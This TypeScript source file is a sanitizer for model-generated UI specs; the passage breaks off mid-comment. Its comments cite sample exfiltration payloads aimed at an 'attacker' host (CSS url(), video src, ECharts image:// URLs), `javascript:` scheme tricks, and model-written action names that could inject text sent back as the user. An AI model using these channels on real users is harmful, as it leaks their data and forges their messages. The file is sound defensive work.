/**
 * GenUI spec guard: resource limits, structural validation, and deterministic
 * repair for ```dsh-ui fence specs.
 *
 * The renderer path runs every fence body through `repairGenuiSpec` before
 * rendering, so a pathological or hostile spec — deep nesting, thousands of
 * nodes, oversized strings, out-of-range numbers — degrades gracefully instead
 * of stalling the UI. Repair is deterministic and prefix-stable: a component
 * that survives repair of a partial stream keeps its position when later
 * chunks arrive, so streaming re-renders stay consistent.
 *
 * Policy:
 * - Unknown node `type`s pass through untouched (plugin-registered custom
 *   components via `registerGenuiComponent` are opaque to this package).
 * - Known types: required fields must have the right type or the node is
 *   dropped; numbers are clamped into range; strings truncated; arrays
 *   sliced to their caps; containers recursed with a depth budget.
 * - The whole spec carries a node budget; once exhausted, remaining siblings
 *   are elided.
 */
import type { GenuiFileTreeNode, GenuiList, GenuiNode, GenuiPlot, GenuiPlotSeries, GenuiScene3D, GenuiSpec, GenuiDiagram, GenuiDiagramTheme, GenuiDiagramKind } from './spec.ts'
import { wrapSingleComponentRoot } from './spec.ts'
// CGUI-PATCH: 表达式合法性也归守卫管(见 repairPlotSeries)。safe-math 不 import 任何东西,
// 不会成环。
import { compileMathExpr } from './safe-math.ts'

/** Hard resource limits enforced by repair (and mirrored at render time). */
export const GENUI_LIMITS = {
  // CGUI-PATCH: 围栏原文字节上限。上游全仓没有 raw 长度门,而流式期每 chunk 都要
  // JSON.stringify 两次(memo 比较器 + stateKey),超大子树 = 主线程卡死。
  // 新增上限一律并进这张表(PLAN §5.3 补丁 0),不散落在各文件里。
  /** Maximum size in bytes of a fence body before it degrades to a code block. */
  maxFenceBytes: 128 * 1024,
  /** Maximum nesting depth of the component tree. */
  maxDepth: 8,
  /** Maximum total nodes across the whole spec. */
  maxNodes: 200,
  /** Maximum length of any plain string field. */
  maxString: 2000,
  /** Maximum length of a `code` body. */
  maxCode: 12_000,
  /** Maximum length of a mermaid source. */
  maxMermaid: 8000,
  // CGUI-PATCH(INTERFACE §2.6 例外表):`copy.text` 的上限是 4000,不是 code 的 12000。
  // 上游借用了 maxCode —— 复制按钮旁边显示"将复制 N 字",N 能到 12000 时那颗按钮
  // 一按就是一屏剪贴板,契约把它单列成一档就是这个道理。
  /** Maximum length of a `copy` payload. */
  maxCopyText: 4000,
  /** Maximum `grid` columns. */
  maxGridCols: 12,
  /** Maximum `tabs` count. */
  maxTabs: 12,
  /** Maximum `accordion` items. */
  maxAccordionItems: 24,
  /** Maximum `list` items. */
  maxListItems: 50,
  /** Maximum `select`/`radio` options. */
  maxOptions: 50,
  /** Maximum `table` rows / columns. */
  maxTableRows: 50,
  maxTableCols: 12,
  /** Maximum `chart` data points per series. */
  maxChartPoints: 60,
  /** Maximum `plot` series and per-series parameters. */
  maxPlotSeries: 8,
  maxPlotParams: 6,
  /** Maximum `scene3d` meshes. */
  maxMeshes: 5,
  /** CGUI-PATCH(INTERFACE §2.5 末行):一个围栏内的 scene3d 节点数上限(WebGL 上下文
   * 是浏览器全局资源,超了旧 canvas 被静默回收成黑块)。 */
  maxScene3dPerSpec: 2,
  /** Maximum `quiz` options. */
  maxQuizOptions: 8,
  /** Maximum `steps` / `timeline` / `breadcrumb` / `keyvalue` entries. */
  maxSteps: 24,
  maxTimelineItems: 24,
  maxBreadcrumbItems: 12,
  maxKeyValuePairs: 24,
  /** Maximum `file-tree` nesting. */
  maxTreeDepth: 6,
  /** Maximum `diagram` nodes / edges / zones / focal accents (editorial
   * complexity budget, mirroring diagram-design's §7 limits). */
  maxDiagramNodes: 9,
  maxDiagramEdges: 12,
  maxDiagramZones: 3,
  maxDiagramFocal: 2,
  maxDiagramLabel: 14,

  /** Maximum depth of an `echart` option object (prevents pathological nested
   * ECharts configs from stalling the guard walk). */
  maxEChartOptionDepth: 10,
  /** Maximum length of any single array inside an `echart` option (prevents
   * a model from stalling rendering with `series.data` of hundreds of
   * thousands of points). */
  maxEChartArrayLen: 500,
  /** Maximum total entries (object keys + array elements) traversed while
   * sanitizing an `echart` option. Bounds the walk so a pathologically
   * large option object cannot stall the guard. */
  maxEChartOptionNodes: 2000,
} as const

/** Result of `validateGenuiSpec`. */
export interface GenuiValidation {
  ok: boolean
  /** Human-readable problems, empty when `ok`. */
  errors: string[]
}

/* ---------------- shared field helpers ---------------- */

/** Is `v` one of `values`? (enum guard) */
function inEnum<T extends string>(v: unknown, values: readonly T[]): v is T {
  return typeof v === 'string' && (values as readonly string[]).includes(v)
}

/** String field: truncate a string to `cap`, or undefined when not a string. */
function str(v: unknown, cap: number): string | undefined {
  return typeof v === 'string' ? v.slice(0, cap) : undefined
}

/**
 * CGUI-PATCH(PLAN §1.3.3 L1 / INTERFACE §2.9):标识符字段的形态封闭。
 *
 * action 是全案唯一一条「模型输出 → 用户权限」的写通道:用户点一下,渲染器就**以用户
 * 身份**往会话里发一条消息,而这条消息里会回传模型撰写的动作名。字符集封闭到
 * `[A-Za-z0-9_.:-]` 之后,里面没有空格、引号、换行、尖括号、中文 —— 无法伪造消息边界、
 * 无法写出可读的祈使句。
 *
 * 上游只做 `str(v.action, 200)`(截断),截断留下 200 个攻击者字符;这里改成**整个节点
 * 丢弃** —— 界面上根本没有这个按钮,就没有可点的控件,通道不存在。
 */
export const GENUI_IDENT_RE = /^[A-Za-z0-9_.:-]{1,64}$/

/** 单个标识符是否合规。非字符串(数字/对象/数组/null)一律视同不合规(§2.9 末行)。 */
export function isGenuiIdent(v: unknown): boolean {
  return typeof v === 'string' && GENUI_IDENT_RE.test(v)
}

/**
 * 会随 action 事件回传给模型的标识符字段。`resetAction` 与 `groups` 不在 INTERFACE
 * §2.9 的字面清单里,但它们**同样进外发消息**(`submit-reset` 的动作名与 `groups`
 * 数组,INTERFACE §3.2 表),漏掉就是主锁上的一个洞,所以按同一套规则办。
 */
const IDENT_FIELDS = ['action', 'resetAction', 'id', 'group'] as const

/**
 * 节点携带的标识符字段是否全部合规。**缺失 = 合规**(§5.10:缺失不是错误,不计入
 * 「已忽略」);present-but-invalid = 整个节点丢弃。
 *
 * 检查放在 `repairNode` 顶端而不是 17 个 `opt('action', …)` 站点上,是因为那 17 处只
 * 覆盖"这个类型认识 action"的情况:模型把注入载荷挂在 `card`/`text` 这类不读 action
 * 的类型上,逐站点校验一个都拦不住(t04 最后一条用例正是这个形态)。
 *
 * 覆盖面说准确:这道门覆盖**全部已知类型的顶层字段**(以及将来新加进 IDENT_FIELDS 的
 * 字段)。未知类型的子树不归它管 —— 那条路在 `repairNodeInner` 的 default 分支就整个
 * 丢弃(渲染出 null),再由 L4 的外发白名单兜底。换句话说:这里拦的是"进得来的节点",
 * 进不来的东西压根不存在,不是这道门放过了它。
 */
function identifiersOk(v: Record<string, unknown>): boolean {
  for (const k of IDENT_FIELDS) {
    if (v[k] !== undefined && !isGenuiIdent(v[k])) return false
  }
  // `groups` 是 group 名的数组;非数组走既有的"该字段丢弃"路径,不牵连整个节点。
  if (Array.isArray(v.groups) && !v.groups.every(isGenuiIdent)) return false
  return true
}

/**
 * Color field: the value lands in an inline `style` (background/stroke) or
 * THREE.Color. Arbitrary CSS values are an exfiltration channel — a model
 * (or a hostile spec) could emit `url(https://attacker/track?...)` and the
 * browser would fetch it. Only formats that name a color pass: hex, rgb/hsl
 * functions, and host theme variables. Anything else degrades to the
 * component's default palette.
 *
 * CGUI-PATCH(INTERFACE §2.7):变量那一档从 `var(--dsw-*)` 换成 `var(--color-*)`。
 * 契约给模型的四种形态是 hex / rgb(a) / hsl(a) / **CC-GUI 主题变量**,而 CC-GUI 的
 * 主题变量就叫 `--color-*`(`var(--color-accent)` / `var(--color-ink)`);`--dsw-*` 是
 * 上游自己设计系统的名字,模型无从知道也不该用。
 * 只影响 guard 对**模型写的 spec 字段**的校验;上游 CSS 文件内部照旧用 `--dsw-*`
 * 写组件默认色,那条路不经过这里。
 * "任意 var(--其他前缀)"按契约明确拒绝 —— 前缀写死,不许放宽成 `var(--[\w-]+)`,
 * 否则 `var(--x, url(https://…))` 这类兜底值又把外发通道开回来。
 */
const SAFE_COLOR_RE = /^(?:#[\da-fA-F]{3,8}|rgba?\([^)]{0,64}\)|hsla?\([^)]{0,64}\)|var\(--color-[\w-]+(?:,\s*#[0-9a-fA-F]{3,8})?\))$/

function color(v: unknown): string | undefined {
  if (typeof v !== 'string') return undefined
  const s = v.trim()
  return s.length <= 64 && SAFE_COLOR_RE.test(s) ? s : undefined
}

/**
 * Link target field: only http(s) and mailto survive. `javascript:`/`data:`
 * and every other scheme degrade to a plain-text node — the model's link is
 * display, not an execution channel.
 */
function safeHref(v: unknown): string | undefined {
  if (typeof v !== 'string') return undefined
  const s = v.trim()
  if (s.length > 2048) return undefined
  return /^https?:\/\//i.test(s) || /^mailto:[^@\s]+@[^@\s]+$/i.test(s) ? s : undefined
}

/**
 * CGUI-PATCH(缺口 C / PLAN §5.3 补丁 3):**外部资源引用**的唯一判定,两处消费
 * (媒体 `src`/`poster`、echart option 里的任意字符串)。收敛成一条,免得再漏别的键名。
 *
 * 危害不是 XSS,是**外发**:`<video src="http://attacker/x?d=…">` 与 ECharts 的
 * `symbol:"image://http://attacker/x?d=…"` / `graphic.style.image` /
 * `backgroundColor.image` 都让浏览器**零点击**主动连外网,泄露用户 IP 与 URL 里
 * 编码的任意内容([安全 §3.3 / §5.3])。CC-GUI 公开版用户不该因为看个图表就裸连外网。
 */
function isExternalRef(s: string): boolean {
  return /^(?:image:\/\/|https?:\/\/|\/\/)/i.test(s)
}

/**
 * CGUI-PATCH:剔除全部 C0/C1 控制符与空白**再判协议**。上游只 `trim()` 首尾空白,于是
 * `java<TAB>script:` 被当相对路径放行 —— 而浏览器的 URL 解析器**会**把这些字符剔掉再
 * 解析,最终就是 `javascript:`([安全 §5.2])。媒体 src 不是导航上下文,当前不可利用;
 * 但这个 helper 一旦被复用到 `href` / `window.open` 上就直接是 XSS,趁现在修死。
 *
 * 只用于**判定**,不改返回值:路径里的空格是路径的一部分,剔掉就换了个地址。
 */
function stripControl(s: string): string {
  // eslint-disable-next-line no-control-regex
  return s.replace(/[\u0000-\u0020\u007f-\u009f]/g, '')
}

/**
 * Media loads bytes, so accept only same-origin relative paths.
 *
 * CGUI-PATCH(收紧 T1):上游放行绝对 `http(s)://`,这里改成拒绝 —— 用户零点击就发起
 * 外连,是 IP/内容外泄向量(INTERFACE §5.4)。上游 SKILL.md 的例子本来就用相对路径,
 * 影响面小;真要放外链回来,把下面第一条 `isExternalRef` 判断删掉即可。
 * 其余(任何 scheme、协议相对、反斜杠变形)与上游同,只是判定前先剔控制符。
 */
function safeMediaSrc(v: unknown): string | undefined {
  if (typeof v !== 'string') return undefined
  const s = v.trim()
  if (s === '' || s.length > 2048) return undefined
  const probe = stripControl(s)
  if (probe === '') return undefined
  if (isExternalRef(probe)) return undefined                  // 外链(含 // 协议相对)
  if (/^[a-z][a-z0-9+.-]*:/i.test(probe)) return undefined     // javascript: / data: / file: / blob: …
  if (/^[/\\]{2}/.test(probe)) return undefined                // \\host、/\host 等反斜杠变形
  return s
}

/** Finite-number field: clamp into [min, max], or undefined when not finite. */
function num(v: unknown, min: number, max: number): number | undefined {
  return typeof v === 'number' && Number.isFinite(v) ? Math.min(max, Math.max(min, v)) : undefined
}

/** Integer field: clamp into [min, max], or undefined when not a finite integer. */
function int(v: unknown, min: number, max: number): number | undefined {
  return typeof v === 'number' && Number.isFinite(v) ? Math.min(max, Math.max(min, Math.trunc(v))) : undefined
}

/** Optional enum field: the value when it matches, otherwise undefined. */
function enu<T extends string>(v: unknown, values: readonly T[]): T | undefined {
  return inEnum(v, values) ? v : undefined
}

/** Plain object (not array, not null). */
function obj(v: unknown): Record<string, unknown> | undefined {
  return typeof v === 'object' && v !== null && !Array.isArray(v) ? v as Record<string, unknown> : undefined
}

/**
 * Optional-field spread helper. `exactOptionalPropertyTypes` forbids
 * `{ gap: number | undefined }`; computing the value into a const first and
 * spreading `opt('gap', g)` keeps every optional field either absent or a
 * plain value.
 */
function opt<K extends string, V>(key: K, value: V | undefined): Partial<Record<K, V>> {
  return value === undefined ? {} : { [key]: value } as Partial<Record<K, V>>
}

const TEXT_SIZES = ['h1', 'h2', 'h3', 'body', 'muted', 'caption'] as const
const BUTTON_TONES = ['primary', 'danger', 'success', 'ghost'] as const
const BADGE_TONES = ['success', 'warn', 'danger', 'accent'] as const
const INPUT_TYPES = ['text', 'email', 'password'] as const
const CALLOUT_TONES = ['info', 'success', 'warning', 'error'] as const
const CHART_KINDS = ['bars', 'line', 'donut'] as const
const PLOT_KINDS = ['line', 'area', 'scatter'] as const
const MEDIA_ASPECT_RATIOS = ['16:9', '4:3', '1:1', '9:16'] as const
const MESH_SHAPES = ['box', 'sphere', 'cone', 'cylinder', 'torus'] as const
const FILE_TYPES = ['file', 'dir'] as const
const DIAGRAM_KINDS: readonly string[] = [
  'architecture', 'it-state', 'flowchart', 'sequence', 'state', 'er', 'timeline',
  'swimlane', 'quadrant', 'radar', 'loop', 'nested', 'tree', 'org-chart', 'layers',
  'venn', 'pyramid', 'bar', 'line', 'gantt', 'scatter', 'high-level', 'process',
  'medallion', 'data-flow', 'dp-integration', 'dp-security-matrix',
]
const DIAGRAM_NODE_TYPES = ['focal', 'backend', 'store', 'external', 'input', 'optional', 'security'] as const
const DIAGRAM_VARIANTS = ['light', 'dark', 'editorial'] as const
const DIAGRAM_EDGE_KINDS = ['solid', 'dashed', 'accent', 'link'] as const
const DIAGRAM_ROUTES = ['auto', 'orthogonal', 'straight'] as const

const ECHART_PRESETS = ['bar', 'line', 'area', 'pie', 'scatter'] as const

/* ---------------- repair ---------------- */

interface RepairCtx {
  /** Nodes left in the budget; 0 stops the walk. */
  remaining: number
  /**
   * CGUI-PATCH(PLAN §5.3 补丁 1-3 / INTERFACE §5.2):被丢弃的节点数,就是块底部
   * 灰字「N 个不支持的组件已忽略」的 N。上游"被拦下的节点静默消失,用户和开发者
   * 都看不到"([安全 §9.2-6]),诊断能力弱于防护能力。
   */
  dropped: number
  /**
   * CGUI-PATCH:活下来的节点数(全树,不只根层)。0 = 一个可渲染组件都没有 ⟹ 整块
   * 退回原始代码块,而不是渲染成一张空卡(INTERFACE §5.2 末段)。
   */
  kept: number
  /**
   * CGUI-PATCH(INTERFACE §2.5 末行 / §5.3):**一个围栏内**已收下的 scene3d 个数。
   * 上限 2 是防 WebGL 上下文耗尽 —— 那是浏览器的全局资源(超了旧 canvas 会被静默
   * 回收成黑块),所以只能按整份 spec 计,不能像别的上限那样按节点自己算。
   */
  scene3d: number
}

/** Walk `list` with the shared node budget; drops invalid entries. */
function repairItems(list: unknown, ctx: RepairCtx, depth: number): GenuiNode[] {
  if (!Array.isArray(list)) return []
  const out: GenuiNode[] = []
  for (let i = 0; i < list.length; i++) {
    if (ctx.remaining <= 0) {
      // CGUI-PATCH: 预算耗尽而省略的兄弟同样计入「已忽略」(INTERFACE §9.1 把
      // 「超预算裁剪」列进了灰字的触发条件)。只加个数,不遍历,超大列表零成本。
      ctx.dropped += list.length - i
      break
    }
    ctx.remaining -= 1
    const node = repairNode(list[i], ctx, depth)
    if (node !== null) out.push(node)
  }
  return out
}

/**
 * CGUI-PATCH:计数外壳。每一条丢弃路径 —— 未知类型、标识符不合规、必填字段缺失或
 * 类型不对、媒体地址被拒、超深 —— 最终都从 `repairNodeInner` 返回 `null`,所以计数
 * 放在这一层就覆盖全部丢弃口。分散到十几个 `return null` 站点各记一次的话,漏一处
 * 灰字就少数一个,而"少数一个"没有任何症状(测不出、看不见)。
 */
function repairNode(value: unknown, ctx: RepairCtx, depth: number): GenuiNode | null {
  const node = repairNodeInner(value, ctx, depth)
  if (node === null) ctx.dropped += 1
  else ctx.kept += 1
  return node
}

function repairNodeInner(value: unknown, ctx: RepairCtx, depth: number): GenuiNode | null {
  // CGUI-PATCH(INTERFACE §1.3):差一。`depth` 从 0 起算,所以"第 N 层" = depth N-1,
  // 上限 8 层 ⟹ 允许的最大 depth 是 7。原来的 `depth > maxDepth` 放到了第 9 层。
  if (depth >= GENUI_LIMITS.maxDepth) return null
  const v = obj(value)
  if (v === undefined) return null
  const type = v.type
  if (typeof type !== 'string') return null
  // CGUI-PATCH(PLAN §1.3.3 L1):标识符形态不合规 ⟹ 整个节点丢弃,不是截断后照常渲染。
  if (!identifiersOk(v)) return null
  switch (type) {
    case 'text': {
      const content = str(v.content, GENUI_LIMITS.maxString) ?? str(v.text, GENUI_LIMITS.maxString)
      if (content === undefined) return null
      return { type: 'text', content, ...opt('size', enu(v.size, TEXT_SIZES)), ...opt('center', v.center === true ? true : undefined) }
    }
    case 'row': {
      return { type: 'row', items: repairItems(v.items, ctx, depth + 1), ...opt('wrap', v.wrap === true ? true : undefined), ...opt('spacer', v.spacer === true ? true : undefined) }
    }
    case 'col': {
      return { type: 'col', items: repairItems(v.items, ctx, depth + 1), ...opt('gap', num(v.gap, 0, 96)) }
    }
    case 'grid': {
      return { type: 'grid', cols: int(v.cols, 1, GENUI_LIMITS.maxGridCols) ?? 1, items: repairItems(v.items, ctx, depth + 1) }
    }
    case 'card': {
      return { type: 'card', items: repairItems(v.items, ctx, depth + 1), ...opt('title', str(v.title, GENUI_LIMITS.maxString)) }
    }
    case 'button': {
      const label = str(v.label, GENUI_LIMITS.maxString)
      if (label === undefined) return null
      return {
        type: 'button', label,
        ...opt('tone', enu(v.tone, BUTTON_TONES)),
        ...opt('full', v.full === true ? true : undefined),
        ...opt('small', v.small === true ? true : undefined),
        ...opt('icon', str(v.icon, 64)),
        ...opt('action', str(v.action, 200)),
      }
    }
    case 'input': {
      return {
        type: 'input',
        ...opt('label', str(v.label, GENUI_LIMITS.maxString)),
        ...opt('placeholder', str(v.placeholder, GENUI_LIMITS.maxString)),
        ...opt('value', str(v.value, GENUI_LIMITS.maxString)),
        ...opt('inputType', enu(v.inputType, INPUT_TYPES)),
        ...opt('action', str(v.action, 200)),
        ...opt('id', str(v.id, 200)),
      }
    }
    case 'select': {
      const options = repairStrings(v.options, GENUI_LIMITS.maxOptions, GENUI_LIMITS.maxString)
      if (options === undefined) return null
      return {
        type: 'select', options,
        ...opt('label', str(v.label, GENUI_LIMITS.maxString)),
        ...opt('action', str(v.action, 200)),
        ...opt('selected', int(v.selected, 0, options.length - 1)),
        ...opt('id', str(v.id, 200)),
      }
    }
    case 'checkbox': {
      const label = str(v.label, GENUI_LIMITS.maxString)
      if (label === undefined) return null
      return { type: 'checkbox', label, ...opt('checked', v.checked === true ? true : undefined), ...opt('action', str(v.action, 200)) }
    }
    case 'link': {
      const label = str(v.label, GENUI_LIMITS.maxString)
      if (label === undefined) return null
      return { type: 'link', label, ...opt('href', safeHref(v.href)) }
    }
    case 'audio': {
      const src = safeMediaSrc(v.src)
      if (src === undefined) return null
      return {
        type: 'audio', src,
        ...opt('alt', str(v.alt, GENUI_LIMITS.maxString)),
        ...opt('loop', v.loop === true ? true : undefined),
      }
    }
    case 'video': {
      const src = safeMediaSrc(v.src)
      if (src === undefined) return null
      return {
        type: 'video', src,
        ...opt('alt', str(v.alt, GENUI_LIMITS.maxString)),
        ...opt('poster', safeMediaSrc(v.poster)),
        ...opt('loop', v.loop === true ? true : undefined),
        ...opt('muted', v.muted === true ? true : undefined),
        ...opt('aspectRatio', enu(v.aspectRatio, MEDIA_ASPECT_RATIOS)),
      }
    }
    case 'badge': {
      const label = str(v.label, GENUI_LIMITS.maxString) ?? str(v.text, GENUI_LIMITS.maxString) ?? str(v.value, GENUI_LIMITS.maxString)
      if (label === undefined) return null
      return { type: 'badge', label, ...opt('tone', enu(v.tone, BADGE_TONES)), ...opt('icon', str(v.icon, 64)) }
    }
    case 'stat': {
      const label = str(v.label, GENUI_LIMITS.maxString)
      const value = str(v.value, 128)
      if (label === undefined || value === undefined) return null
      return { type: 'stat', label, value, ...opt('delta', str(v.delta, 64)) }
    }
    case 'progress': {
      const value = num(v.value, 0, 100)
      if (value === undefined) return null
      return { type: 'progress', value, ...opt('label', str(v.label, GENUI_LIMITS.maxString)), ...opt('valueLabel', str(v.valueLabel, 64)) }
    }
    case 'divider': return { type: 'divider' }
    case 'spacer': return { type: 'spacer' }
    case 'avatar': {
      const name = str(v.name, 64)
      if (name === undefined) return null
      return { type: 'avatar', name, ...opt('color', color(v.color)) }
    }
    case 'list': {
      const items = repairListItems(v.items, GENUI_LIMITS.maxListItems, ctx, depth + 1)
      if (items === undefined) return null
      return { type: 'list', items }
    }
    case 'table': {
      let rawCols = v.columns as unknown
      let rawRows = v.rows !== undefined ? v.rows : (v as Record<string, unknown>).data
      // Self-heal model-shaped tables: antd-style object columns
      // ({title,key}) become header strings, and object-array rows (or a
      // `data` alias) flatten to 2D rows keyed by the column keys — without
      // this the whole node is dropped for "missing 2D rows" and the user
      // sees nothing (issue #42).
      if (Array.isArray(rawCols) && rawCols.length > 0 && typeof rawCols[0] === 'object' && rawCols[0] !== null) {
        rawCols = rawCols.map(c => columnHeaderText(c))
      }
      if (Array.isArray(rawRows) && rawRows.length > 0 && typeof rawRows[0] === 'object' && rawRows[0] !== null && !Array.isArray(rawRows[0])) {
        const keys = Array.isArray(v.columns) && v.columns.length > 0 && typeof v.columns[0] === 'object' && v.columns[0] !== null
          ? v.columns.map(c => columnKeyOf(c)).filter((k): k is string => k !== undefined)
          : Object.keys(rawRows[0] as Record<string, unknown>)
        rawRows = rawRows.map(row => keys.map(k => cellText((row as Record<string, unknown>)[k])))
      }
      const columns = repairStrings(rawCols, GENUI_LIMITS.maxTableCols, 128)
      const rows = repairRows(rawRows, GENUI_LIMITS.maxTableRows, GENUI_LIMITS.maxTableCols)
      if (columns === undefined || rows === undefined) return null
      return { type: 'table', columns, rows }
    }
    case 'chart': {
      const data = repairChartData(v.data, GENUI_LIMITS.maxChartPoints)
      const series = Array.isArray(v.series) ? repairSeries(v.series, GENUI_LIMITS.maxPlotSeries, GENUI_LIMITS.maxChartPoints) : undefined
      // `data` is required by the type but grouped bars may ship `series`
      // alone; a series-only chart gets an empty data array (the renderer
      // reads `series` in that case).
      if (data === undefined && series === undefined) return null
      return { type: 'chart', data: data ?? [], ...opt('kind', enu(v.kind, CHART_KINDS)), ...opt('series', series) }
    }
    case 'tabs': {
      const tabs = repairTabs(v.tabs, ctx, depth)
      if (tabs === undefined) return null
      return { type: 'tabs', tabs }
    }
    case 'plot': {
      const series = repairPlotSeries(v.series, GENUI_LIMITS.maxPlotSeries)
      if (series === undefined) return null
      return {
        type: 'plot', series,
        ...opt('xMin', num(v.xMin, -1e6, 1e6)),
        ...opt('xMax', num(v.xMax, -1e6, 1e6)),
        ...opt('yMin', num(v.yMin, -1e9, 1e9)),
        ...opt('yMax', num(v.yMax, -1e9, 1e9)),
        ...opt('title', str(v.title, GENUI_LIMITS.maxString)),
      }
    }
    case 'callout': {
      const content = str(v.content, GENUI_LIMITS.maxString)
      if (content === undefined) return null
      return { type: 'callout', content, ...opt('tone', enu(v.tone, CALLOUT_TONES)), ...opt('title', str(v.title, GENUI_LIMITS.maxString)) }
    }
    case 'steps': {
      const steps = repairSteps(v.steps)
      if (steps === undefined) return null
      return { type: 'steps', steps, ...opt('current', int(v.current, 0, steps.length)) }
    }
    case 'keyvalue': {
      const pairs = repairPairs(v.pairs, GENUI_LIMITS.maxKeyValuePairs)
      if (pairs === undefined) return null
      return { type: 'keyvalue', pairs }
    }
    case 'diff': {
      const diffs = repairDiffs(v.diffs)
      if (diffs === undefined) return null
      return { type: 'diff', diffs }
    }
    case 'json': {
      // Any JSON value is acceptable; only the node itself is validated.
      if (!('value' in v)) return null
      return { type: 'json', value: v.value }
    }
    case 'code': {
      const code = str(v.code, GENUI_LIMITS.maxCode)
      if (code === undefined) return null
      return { type: 'code', code, ...opt('lang', str(v.lang, 64)) }
    }
    case 'radio': {
      const options = repairStrings(v.options, GENUI_LIMITS.maxOptions, GENUI_LIMITS.maxString)
      if (options === undefined) return null
      return {
        type: 'radio', options,
        ...opt('label', str(v.label, GENUI_LIMITS.maxString)),
        ...opt('selected', int(v.selected, 0, options.length - 1)),
        ...opt('action', str(v.action, 200)),
        ...opt('group', str(v.group, 200)),
        // answer: option index (number) or label (string); out-of-range
        // indices are DROPPED (clamping would silently grade against the
        // wrong option)
        ...opt('answer', typeof v.answer === 'number' && Number.isFinite(v.answer)
          && v.answer >= 0 && v.answer < options.length
          ? Math.trunc(v.answer)
          : typeof v.answer === 'string' ? v.answer.slice(0, 512) : undefined),
        ...opt('explanation', str(v.explanation, GENUI_LIMITS.maxString)),
      }
    }
    case 'submit': {
      const label = str(v.label, GENUI_LIMITS.maxString)
      // action is OPTIONAL: local grading (any question carries `answer`)
      // needs no round trip, so a submit without an action is valid. It only
      // becomes semantically required when no local answers exist — the
      // renderer disables the button then (honest affordance).
      const action = str(v.action, 200)
      if (label === undefined) return null
      return {
        type: 'submit', label,
        ...opt('action', action),
        ...opt('resetAction', str(v.resetAction, 200)),
        ...opt('groups', repairStrings(v.groups, GENUI_LIMITS.maxOptions, 200)),
      }
    }
    case 'switch': {
      const label = str(v.label, GENUI_LIMITS.maxString)
      if (label === undefined) return null
      return { type: 'switch', label, ...opt('checked', v.checked === true ? true : undefined), ...opt('action', str(v.action, 200)) }
    }
    case 'slider': {
      const min = num(v.min, -1e9, 1e9) ?? 0
      const max = num(v.max, -1e9, 1e9) ?? 100
      const lo = Math.min(min, max)
      const hi = Math.max(min, max)
      const step = num(v.step, 1e-9, Math.max(hi - lo, 1e-9))
      const value = num(v.value, lo, hi) ?? lo
      return {
        type: 'slider',
        min: lo,
        max: hi,
        ...opt('step', step),
        value,
        ...opt('label', str(v.label, GENUI_LIMITS.maxString)),
        ...opt('action', str(v.action, 200)),
        ...opt('id', str(v.id, 200)),
      }
    }
    case 'textarea': {
      return {
        type: 'textarea',
        ...opt('label', str(v.label, GENUI_LIMITS.maxString)),
        ...opt('placeholder', str(v.placeholder, GENUI_LIMITS.maxString)),
        ...opt('rows', int(v.rows, 1, 30)),
        ...opt('value', str(v.value, GENUI_LIMITS.maxString)),
        ...opt('action', str(v.action, 200)),
        ...opt('id', str(v.id, 200)),
      }
    }
    case 'accordion': {
      const items = repairAccordion(v.items, ctx, depth)
      if (items === undefined) return null
      return { type: 'accordion', items }
    }
    case 'copy': {
      const text = str(v.text, GENUI_LIMITS.maxCopyText)
      if (text === undefined) return null
      return { type: 'copy', text, ...opt('label', str(v.label, 128)) }
    }
    case 'mermaid': {
      const code = str(v.code, GENUI_LIMITS.maxMermaid)
      if (code === undefined) return null
      return { type: 'mermaid', code }
    }
    case 'scene3d': {
      // CGUI-PATCH: 每个围栏至多 2 个 3D 场景,超出的丢弃(计入「已忽略」)。
      if (ctx.scene3d >= GENUI_LIMITS.maxScene3dPerSpec) return null
      const meshes = repairMeshes(v.meshes)
      if (meshes === undefined) return null
      ctx.scene3d += 1
      return { type: 'scene3d', meshes, ...opt('title', str(v.title, GENUI_LIMITS.maxString)), ...opt('ambient', num(v.ambient, 0, 2)), ...opt('background', color(v.background)) }
    }
    case 'diagram': {
      const repaired = repairDiagram(v)
      return repaired
    }
    case 'timeline': {
      const items = repairTimeline(v.items, GENUI_LIMITS.maxTimelineItems)
      if (items === undefined) return null
      return { type: 'timeline', items }
    }
    case 'file-tree': {
      const items = repairTree(v.items, GENUI_LIMITS.maxListItems)
      if (items === undefined) return null
      return { type: 'file-tree', items }
    }
    case 'breadcrumb': {
      const items = repairStrings(v.items, GENUI_LIMITS.maxBreadcrumbItems, GENUI_LIMITS.maxString)
      if (items === undefined) return null
      return { type: 'breadcrumb', items }
    }
    case 'quiz': {
      const question = str(v.question, GENUI_LIMITS.maxString)
      const options = repairQuizOptions(v.options)
      if (question === undefined || options === undefined) return null
      return {
        type: 'quiz', question, options,
        ...opt('explanation', str(v.explanation, GENUI_LIMITS.maxString)),
        ...opt('id', str(v.id, 200)),
        ...opt('action', str(v.action, 200)),
      }
    }
    case 'echart': {
      // Preset shorthand data/series reuse the chart repair helpers.
      const data = v.data !== undefined ? repairChartData(v.data, GENUI_LIMITS.maxChartPoints) : undefined
      const series = v.series !== undefined && Array.isArray(v.series)
        ? repairSeries(v.series, GENUI_LIMITS.maxPlotSeries, GENUI_LIMITS.maxChartPoints)
        : undefined
      // Full option: depth-bounded pass-through (the model writes the ECharts
      // option object; the guard walks it to cap nesting but does not
      // validate ECharts semantics — that is echarts' own job).
      const budget: EChartSanitizeBudget = { count: GENUI_LIMITS.maxEChartOptionNodes, voided: false }
      const sanitized = v.option !== undefined
        ? sanitizeEChartOption(v.option, 0, budget)
        : undefined
      // A chart option root is always a plain object; a scalar root is
      // invalid, so degrade to preset/data/series handling (option dropped).
      // CGUI-PATCH: `budget.voided` = 三条预算越界 ⟹ 整份作废(INTERFACE §5.5),
      // 与"根不是对象"同一条出口:回退 preset/data,都没有就整个节点不渲染。
      const option: Record<string, unknown> | undefined =
        budget.voided || sanitized === undefined || typeof sanitized !== 'object' || sanitized === null || Array.isArray(sanitized)
          ? undefined
          : sanitized as Record<string, unknown>
      // At least one of preset+data or option must be present.
      if (option === undefined && data === undefined && series === undefined) return null
      return {
        type: 'echart',
        ...opt('title', str(v.title, GENUI_LIMITS.maxString)),
        ...opt('height', int(v.height, 100, 800)),
        ...opt('preset', enu(v.preset, ECHART_PRESETS)),
        ...opt('data', data),
        ...opt('series', series),
        ...opt('option', option),
      }
    }
    default:
      // CGUI-PATCH(缺口 A / PLAN §5.3 补丁 1 / INTERFACE §5.2):上游这里是
      // `return value as GenuiNode` —— 未知类型整棵子树**原样穿过**闸门:不限深度、
      // 不限字符串长度、自己只占 1 个节点预算。`{"type":"zzz","x":<20MB 嵌套数组>}`
      // 就把整张 GENUI_LIMITS 架空;更糟的是流式期每来一个 chunk 都要把它
